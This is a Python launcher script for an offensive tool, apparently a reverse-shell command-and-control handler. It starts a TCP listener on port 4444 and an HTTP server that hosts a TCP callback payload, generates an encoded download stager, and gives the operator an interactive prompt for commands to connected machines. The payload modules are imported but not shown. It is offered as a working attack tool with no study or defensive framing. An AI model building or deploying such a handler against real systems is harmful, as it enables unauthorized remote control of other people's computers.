from core.TCPHandler            import *
from core.HTTPHandler           import *
from core.CommandHandler        import *
from core.TextAssets            import *
from core.Payload               import *

import argparse

def vanguard() -> None:
        parser                          = argparse.ArgumentParser()
        parser.add_argument("-c", "--callback",   type=str, help="Callback address.")
        parser.add_argument("-tp", "--tcp-port",  type=int, default=4444, help="TCP listen port.")
        parser.add_argument("-hp", "--http-port", type=int, default=8080, help="HTTP listen port.")
        parser.add_argument("-q", "--quiet",      action="store_true")
        arguments                       = parser.parse_args()

        if not arguments.quiet:
                bannerfy()

        if not arguments.callback:
                return debug("Callback address not specified (-c callback)")

        tcp_server                      = TCPHandler()
        tcp_server.bind_address         = "0.0.0.0"
        tcp_server.bind_port            = arguments.tcp_port
        
        if not tcp_server.start():
                return

        http_server                     = HTTPServer()
        http_server.bind_address        = "0.0.0.0"
        http_server.bind_port           = arguments.http_port
        http_server.payload             = Payload.tcp(arguments.callback, str(tcp_server.bind_port))
        
        
        if not http_server.start():
                return

        command_handler                 = CommandHandler()
        command_handler.tcp_server      = tcp_server
        command_handler.http_server     = http_server
        command_handler.callback        = arguments.callback
        command_handler.command("generate http encode")

        try:
                while True:
                        user_input      = input(prompt())
                        command_handler.command(user_input)

        except KeyboardInterrupt:
                info("Exiting ...")

        except Exception as exception:
                error("Exception: {}".format(exception))

        command_handler.eradicate()
        exit()

if __name__ == "__main__":
        vanguard()